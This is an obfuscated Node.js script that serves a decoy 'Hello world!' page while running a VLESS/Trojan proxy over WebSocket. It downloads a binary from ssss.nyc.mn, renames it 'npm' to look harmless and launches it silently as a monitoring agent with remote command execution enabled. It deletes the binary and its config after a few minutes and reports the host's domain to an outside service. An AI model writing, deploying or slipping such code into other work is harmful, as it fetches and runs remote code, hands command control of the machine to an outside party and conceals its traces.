const _0x2fa85b=_0x4421;(function(_0x1b36e4,_0x3adf7e){const _0x58355a=_0x4421,_0x4e7f68=_0x1b36e4();while(!![]){try{const _0x35e137=parseInt(_0x58355a(0x1d1))/0x1+-parseInt(_0x58355a(0x1da))/0x2+parseInt(_0x58355a(0x1a0))/0x3*(-parseInt(_0x58355a(0x1e9))/0x4)+parseInt(_0x58355a(0x1b7))/0x5*(-parseInt(_0x58355a(0x1af))/0x6)+parseInt(_0x58355a(0x1f5))/0x7+parseInt(_0x58355a(0x1c0))/0x8*(-parseInt(_0x58355a(0x1d9))/0x9)+-parseInt(_0x58355a(0x1bf))/0xa*(-parseInt(_0x58355a(0x205))/0xb);if(_0x35e137===_0x3adf7e)break;else _0x4e7f68['push'](_0x4e7f68['shift']());}catch(_0x261437){_0x4e7f68['push'](_0x4e7f68['shift']());}}}(_0x18ca,0xb09b9));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x2fa85b(0x1d4)),net=require(_0x2fa85b(0x1b9)),path=require(_0x2fa85b(0x1cf)),crypto=require(_0x2fa85b(0x1be)),{Buffer}=require(_0x2fa85b(0x20d)),{exec,execSync}=require(_0x2fa85b(0x20a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1c4)]||'696a8e89-0f70-4984-9e4c-316648b89140',NEZHA_SERVER=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1ea)]||'',NEZHA_PORT=process[_0x2fa85b(0x19d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1ab)]||'',DOMAIN=process[_0x2fa85b(0x19d)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1a2)]||!![],WSPATH=process['env'][_0x2fa85b(0x1ba)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x2fa85b(0x19d)]['SUB_PATH']||_0x2fa85b(0x1d6),NAME=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1e5)]||_0x2fa85b(0x1ce),PORT=process[_0x2fa85b(0x19d)][_0x2fa85b(0x1dd)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x52e6bb=_0x2fa85b;try{const _0x305209=await axios[_0x52e6bb(0x1b2)](_0x52e6bb(0x1cb)),_0xb46f7f=_0x305209[_0x52e6bb(0x1e4)];ISP=(_0xb46f7f['country_code']+'-'+_0xb46f7f[_0x52e6bb(0x1f2)])[_0x52e6bb(0x1c7)](/ /g,'_');}catch(_0x50f69f){ISP=_0x52e6bb(0x1ad);}};function _0x18ca(){const _0x3c9d03=['trim','https://amd64.ssss.nyc.mn/v1','utf8','reduce','stream','--tls','data','NAME','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','readUInt8','sha224','4hTOZMs','NEZHA_SERVER','base64','false','npm','&fp=chrome&type=ws&host=','Status','every','slice','isp','writeHead','index.html','5443501vrXrZI','split','text/plain','error','writeFileSync','utf-8','join','log','arm64','&path=%2F','8.8.4.4','from','hex','write','chmod\x20+x\x20npm','message','43213852OcSrxM','client_secret:\x20','finish','config.yaml','type','child_process','concat','arch','buffer','connect','https://dns.google/resolve?name=','readUInt16BE','length','readFile','env','Hello\x20world!','update','4310739mfVXpV','substr','AUTO_ACCESS','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','once','connection','https://arm64.ssss.nyc.mn/agent','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2087','npm\x20download\x20successfully','NEZHA_KEY','createWriteStream','Unknown','post','6NfCsLR','8443','map','get','test','443','close','end','7119995rkgkLy','url','net','WSPATH','https://arm64.ssss.nyc.mn/v1','Automatic\x20Access\x20Task\x20added\x20successfully','application/json','crypto','10KmjrvZ','17944jyIPZg','catch','Server',':443?security=tls&sni=','UUID','&type=A','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','Answer','includes','/bin/bash','https://api.ip.sb/geoip','decode','2053','Hug','path','then','962935Kxngpl','npm\x20is\x20running','\x20with\x20all\x20DNS\x20servers','axios','pipe','sub','pop','toString','4869ouPgjd','1742700RLVCqq','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20running\x20error:','PORT'];_0x18ca=function(){return _0x3c9d03;};return _0x18ca();}GetISP();const httpServer=http['createServer']((_0x30161b,_0x11050c)=>{const _0x37c340=_0x2fa85b;if(_0x30161b['url']==='/'){const _0xc20c6d=path[_0x37c340(0x1fb)](__dirname,_0x37c340(0x1f4));fs[_0x37c340(0x19c)](_0xc20c6d,_0x37c340(0x1e0),(_0x4f5cfa,_0x1e8bdc)=>{const _0x3b417a=_0x37c340;if(_0x4f5cfa){_0x11050c[_0x3b417a(0x1f3)](0xc8,{'Content-Type':'text/html'}),_0x11050c[_0x3b417a(0x1b6)](_0x3b417a(0x19e));return;}_0x11050c[_0x3b417a(0x1f3)](0xc8,{'Content-Type':'text/html'}),_0x11050c[_0x3b417a(0x1b6)](_0x1e8bdc);});return;}else{if(_0x30161b[_0x37c340(0x1b8)]==='/'+SUB_PATH){const _0x327fe1=NAME?NAME+'-'+ISP:ISP,_0x35dc31='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x37c340(0x1ee)+DOMAIN+_0x37c340(0x1fe)+WSPATH+'#'+_0x327fe1,_0x91ecd8='trojan://'+UUID+'@'+DOMAIN+_0x37c340(0x1c3)+DOMAIN+_0x37c340(0x1ee)+DOMAIN+_0x37c340(0x1fe)+WSPATH+'#'+_0x327fe1,_0x2a5f31=_0x35dc31+'\x0a'+_0x91ecd8,_0x2d22ab=Buffer[_0x37c340(0x200)](_0x2a5f31)[_0x37c340(0x1d8)](_0x37c340(0x1eb));_0x11050c['writeHead'](0xc8,{'Content-Type':_0x37c340(0x1f7)}),_0x11050c[_0x37c340(0x1b6)](_0x2d22ab+'\x0a');}else _0x11050c[_0x37c340(0x1f3)](0x194,{'Content-Type':_0x37c340(0x1f7)}),_0x11050c[_0x37c340(0x1b6)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2fa85b(0x1c2))]({'server':httpServer}),uuid=UUID[_0x2fa85b(0x1c7)](/-/g,''),DNS_SERVERS=[_0x2fa85b(0x1ff),'1.1.1.1'];function resolveHost(_0xe2fd83){return new Promise((_0x982f4f,_0x7410b0)=>{const _0xee3543=_0x4421;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xee3543(0x1b3)](_0xe2fd83)){_0x982f4f(_0xe2fd83);return;}let _0x44e585=0x0;function _0x2b623a(){const _0x15abe8=_0xee3543;if(_0x44e585>=DNS_SERVERS['length']){_0x7410b0(new Error('Failed\x20to\x20resolve\x20'+_0xe2fd83+_0x15abe8(0x1d3)));return;}const _0x461b82=DNS_SERVERS[_0x44e585];_0x44e585++;const _0x27ae17=_0x15abe8(0x199)+encodeURIComponent(_0xe2fd83)+_0x15abe8(0x1c5);axios[_0x15abe8(0x1b2)](_0x27ae17,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x15abe8(0x1d0)](_0xad2b5f=>{const _0x547681=_0x15abe8,_0x4f090c=_0xad2b5f[_0x547681(0x1e4)];if(_0x4f090c[_0x547681(0x1ef)]===0x0&&_0x4f090c[_0x547681(0x1c8)]&&_0x4f090c['Answer'][_0x547681(0x19b)]>0x0){const _0x378a7b=_0x4f090c[_0x547681(0x1c8)]['find'](_0x3dc763=>_0x3dc763[_0x547681(0x209)]===0x1);if(_0x378a7b){_0x982f4f(_0x378a7b['data']);return;}}_0x2b623a();})[_0x15abe8(0x1c1)](_0x2ab8d3=>{_0x2b623a();});}_0x2b623a();});}function handleVlessConnection(_0x30fae4,_0x314e4a){const _0x18268=_0x2fa85b,[_0x5bc2b1]=_0x314e4a,_0x17f1d3=_0x314e4a[_0x18268(0x1f1)](0x1,0x11);if(!_0x17f1d3[_0x18268(0x1f0)]((_0x2ded03,_0x35b31f)=>_0x2ded03==parseInt(uuid[_0x18268(0x1a1)](_0x35b31f*0x2,0x2),0x10)))return![];let _0xb9d5=_0x314e4a[_0x18268(0x1f1)](0x11,0x12)[_0x18268(0x1e7)]()+0x13;const _0x20b967=_0x314e4a[_0x18268(0x1f1)](_0xb9d5,_0xb9d5+=0x2)[_0x18268(0x19a)](0x0),_0x16d835=_0x314e4a[_0x18268(0x1f1)](_0xb9d5,_0xb9d5+=0x1)[_0x18268(0x1e7)](),_0x468349=_0x16d835==0x1?_0x314e4a[_0x18268(0x1f1)](_0xb9d5,_0xb9d5+=0x4)[_0x18268(0x1fb)]('.'):_0x16d835==0x2?new TextDecoder()[_0x18268(0x1cc)](_0x314e4a[_0x18268(0x1f1)](_0xb9d5+0x1,_0xb9d5+=0x1+_0x314e4a[_0x18268(0x1f1)](_0xb9d5,_0xb9d5+0x1)[_0x18268(0x1e7)]())):_0x16d835==0x3?_0x314e4a['slice'](_0xb9d5,_0xb9d5+=0x10)[_0x18268(0x1e1)]((_0x270a06,_0x36cff1,_0x14ef52,_0x5758ef)=>_0x14ef52%0x2?_0x270a06[_0x18268(0x20b)](_0x5758ef['slice'](_0x14ef52-0x1,_0x14ef52+0x1)):_0x270a06,[])[_0x18268(0x1b1)](_0x2605af=>_0x2605af['readUInt16BE'](0x0)['toString'](0x10))[_0x18268(0x1fb)](':'):'';_0x30fae4['send'](new Uint8Array([_0x5bc2b1,0x0]));const _0x35f201=createWebSocketStream(_0x30fae4);return resolveHost(_0x468349)[_0x18268(0x1d0)](_0x28249a=>{const _0xf403ad=_0x18268;net[_0xf403ad(0x20e)]({'host':_0x28249a,'port':_0x20b967},function(){const _0x5e71c6=_0xf403ad;this['write'](_0x314e4a[_0x5e71c6(0x1f1)](_0xb9d5)),_0x35f201['on']('error',()=>{})[_0x5e71c6(0x1d5)](this)['on'](_0x5e71c6(0x1f8),()=>{})[_0x5e71c6(0x1d5)](_0x35f201);})['on']('error',()=>{});})['catch'](_0x56de2d=>{const _0x5757da=_0x18268;net[_0x5757da(0x20e)]({'host':_0x468349,'port':_0x20b967},function(){const _0x58b66=_0x5757da;this[_0x58b66(0x202)](_0x314e4a[_0x58b66(0x1f1)](_0xb9d5)),_0x35f201['on'](_0x58b66(0x1f8),()=>{})['pipe'](this)['on'](_0x58b66(0x1f8),()=>{})['pipe'](_0x35f201);})['on'](_0x5757da(0x1f8),()=>{});}),!![];}function handleTrojanConnection(_0xdcefb8,_0x50f5ea){const _0x9aacc8=_0x2fa85b;try{if(_0x50f5ea[_0x9aacc8(0x19b)]<0x3a)return![];const _0x5593d0=_0x50f5ea[_0x9aacc8(0x1f1)](0x0,0x38)[_0x9aacc8(0x1d8)](),_0x79aed4=[UUID];let _0x202d94=null;for(const _0x455572 of _0x79aed4){const _0x289133=crypto['createHash'](_0x9aacc8(0x1e8))[_0x9aacc8(0x19f)](_0x455572)['digest'](_0x9aacc8(0x201));if(_0x289133===_0x5593d0){_0x202d94=_0x455572;break;}}if(!_0x202d94)return![];let _0x361cda=0x38;_0x50f5ea[_0x361cda]===0xd&&_0x50f5ea[_0x361cda+0x1]===0xa&&(_0x361cda+=0x2);const _0x391aec=_0x50f5ea[_0x361cda];if(_0x391aec!==0x1)return![];_0x361cda+=0x1;const _0x189ee7=_0x50f5ea[_0x361cda];_0x361cda+=0x1;let _0x6280f0,_0x4714fc;if(_0x189ee7===0x1)_0x6280f0=_0x50f5ea[_0x9aacc8(0x1f1)](_0x361cda,_0x361cda+0x4)[_0x9aacc8(0x1fb)]('.'),_0x361cda+=0x4;else{if(_0x189ee7===0x3){const _0x465932=_0x50f5ea[_0x361cda];_0x361cda+=0x1,_0x6280f0=_0x50f5ea[_0x9aacc8(0x1f1)](_0x361cda,_0x361cda+_0x465932)[_0x9aacc8(0x1d8)](),_0x361cda+=_0x465932;}else{if(_0x189ee7===0x4)_0x6280f0=_0x50f5ea[_0x9aacc8(0x1f1)](_0x361cda,_0x361cda+0x10)[_0x9aacc8(0x1e1)]((_0x3fab27,_0x2c89f5,_0x434175,_0x14ee9b)=>_0x434175%0x2?_0x3fab27[_0x9aacc8(0x20b)](_0x14ee9b['slice'](_0x434175-0x1,_0x434175+0x1)):_0x3fab27,[])[_0x9aacc8(0x1b1)](_0x2f2368=>_0x2f2368[_0x9aacc8(0x19a)](0x0)['toString'](0x10))[_0x9aacc8(0x1fb)](':'),_0x361cda+=0x10;else return![];}}_0x4714fc=_0x50f5ea['readUInt16BE'](_0x361cda),_0x361cda+=0x2;_0x361cda<_0x50f5ea[_0x9aacc8(0x19b)]&&_0x50f5ea[_0x361cda]===0xd&&_0x50f5ea[_0x361cda+0x1]===0xa&&(_0x361cda+=0x2);const _0x28a102=createWebSocketStream(_0xdcefb8);return resolveHost(_0x6280f0)[_0x9aacc8(0x1d0)](_0x144c5c=>{const _0x5eecb5=_0x9aacc8;net[_0x5eecb5(0x20e)]({'host':_0x144c5c,'port':_0x4714fc},function(){const _0x2d57cb=_0x5eecb5;_0x361cda<_0x50f5ea[_0x2d57cb(0x19b)]&&this['write'](_0x50f5ea[_0x2d57cb(0x1f1)](_0x361cda)),_0x28a102['on'](_0x2d57cb(0x1f8),()=>{})[_0x2d57cb(0x1d5)](this)['on'](_0x2d57cb(0x1f8),()=>{})[_0x2d57cb(0x1d5)](_0x28a102);})['on'](_0x5eecb5(0x1f8),()=>{});})[_0x9aacc8(0x1c1)](_0x5db2dd=>{const _0x8ba4b7=_0x9aacc8;net[_0x8ba4b7(0x20e)]({'host':_0x6280f0,'port':_0x4714fc},function(){const _0x324292=_0x8ba4b7;_0x361cda<_0x50f5ea[_0x324292(0x19b)]&&this[_0x324292(0x202)](_0x50f5ea[_0x324292(0x1f1)](_0x361cda)),_0x28a102['on'](_0x324292(0x1f8),()=>{})[_0x324292(0x1d5)](this)['on'](_0x324292(0x1f8),()=>{})[_0x324292(0x1d5)](_0x28a102);})['on'](_0x8ba4b7(0x1f8),()=>{});}),!![];}catch(_0x2062ad){return![];}}wss['on'](_0x2fa85b(0x1a5),(_0x167222,_0x4aba08)=>{const _0x2bbc74=_0x2fa85b,_0x50b345=_0x4aba08['url']||'';_0x167222[_0x2bbc74(0x1a4)](_0x2bbc74(0x204),_0x36360a=>{const _0x232cfd=_0x2bbc74;if(_0x36360a[_0x232cfd(0x19b)]>0x11&&_0x36360a[0x0]===0x0){const _0x4d57e6=_0x36360a[_0x232cfd(0x1f1)](0x1,0x11),_0xb038a0=_0x4d57e6['every']((_0x15fa48,_0x3e76b7)=>_0x15fa48==parseInt(uuid[_0x232cfd(0x1a1)](_0x3e76b7*0x2,0x2),0x10));if(_0xb038a0){!handleVlessConnection(_0x167222,_0x36360a)&&_0x167222['close']();return;}}!handleTrojanConnection(_0x167222,_0x36360a)&&_0x167222[_0x232cfd(0x1b5)]();})['on'](_0x2bbc74(0x1f8),()=>{});});const getDownloadUrl=()=>{const _0x56f6c1=_0x2fa85b,_0x3888c0=os[_0x56f6c1(0x20c)]();return _0x3888c0==='arm'||_0x3888c0===_0x56f6c1(0x1fd)||_0x3888c0==='aarch64'?!NEZHA_PORT?_0x56f6c1(0x1bb):_0x56f6c1(0x1a6):!NEZHA_PORT?_0x56f6c1(0x1df):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x54f55c=_0x2fa85b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3cc999=getDownloadUrl(),_0x2a69e2=await axios({'method':_0x54f55c(0x1b2),'url':_0x3cc999,'responseType':_0x54f55c(0x1e2)}),_0x9529ad=fs[_0x54f55c(0x1ac)](_0x54f55c(0x1ed));return _0x2a69e2[_0x54f55c(0x1e4)]['pipe'](_0x9529ad),new Promise((_0x2fc35a,_0x285759)=>{const _0x4ede91=_0x54f55c;_0x9529ad['on'](_0x4ede91(0x207),()=>{const _0x471f7e=_0x4ede91;console[_0x471f7e(0x1fc)](_0x471f7e(0x1aa)),exec(_0x471f7e(0x203),_0x2f09b0=>{if(_0x2f09b0)_0x285759(_0x2f09b0);_0x2fc35a();});}),_0x9529ad['on'](_0x4ede91(0x1f8),_0x285759);});}catch(_0x52c249){throw _0x52c249;}},runnz=async()=>{const _0x50f600=_0x2fa85b;try{const _0x425cf1=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x50f600(0x1fa)});if(_0x425cf1[_0x50f600(0x1de)]()!==''){console[_0x50f600(0x1fc)](_0x50f600(0x1db));return;}}catch(_0x56ee94){}await downloadFile();let _0x43b6ff='',_0x2fa1d4=[_0x50f600(0x1b4),_0x50f600(0x1b0),'2096',_0x50f600(0x1a9),'2083',_0x50f600(0x1cd)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x16333e=_0x2fa1d4[_0x50f600(0x1c9)](NEZHA_PORT)?_0x50f600(0x1e3):'';_0x43b6ff='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x16333e+_0x50f600(0x1a3);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x43ad07=NEZHA_SERVER[_0x50f600(0x1c9)](':')?NEZHA_SERVER[_0x50f600(0x1f6)](':')[_0x50f600(0x1d7)]():'',_0x58113e=_0x2fa1d4['includes'](_0x43ad07)?'true':_0x50f600(0x1ec),_0x4301d7=_0x50f600(0x206)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x50f600(0x1c6)+_0x58113e+_0x50f600(0x1a8)+UUID;fs[_0x50f600(0x1f9)]('config.yaml',_0x4301d7);}_0x43b6ff=_0x50f600(0x1e6);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x43b6ff,{'shell':_0x50f600(0x1ca)},_0x2b70d7=>{const _0xbc1e84=_0x50f600;if(_0x2b70d7)console[_0xbc1e84(0x1f8)](_0xbc1e84(0x1dc),_0x2b70d7);else console[_0xbc1e84(0x1fc)](_0xbc1e84(0x1d2));});}catch(_0xcc1d18){console[_0x50f600(0x1f8)](_0x50f600(0x1a7)+_0xcc1d18);}};async function addAccessTask(){const _0x4a321d=_0x2fa85b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x57ab99='https://'+DOMAIN;try{const _0xbb2fe8=await axios[_0x4a321d(0x1ae)]('https://oooo.serv00.net/add-url',{'url':_0x57ab99},{'headers':{'Content-Type':_0x4a321d(0x1bd)}});console[_0x4a321d(0x1fc)](_0x4a321d(0x1bc));}catch(_0x1c866a){}}function _0x4421(_0x5a4145,_0x12e016){_0x5a4145=_0x5a4145-0x199;const _0x18ca6f=_0x18ca();let _0x442166=_0x18ca6f[_0x5a4145];return _0x442166;}const delFiles=()=>{const _0x560c8c=_0x2fa85b;fs['unlink']('npm',()=>{}),fs['unlink'](_0x560c8c(0x208),()=>{});};httpServer['listen'](PORT,()=>{const _0x236f33=_0x2fa85b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x236f33(0x1fc)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
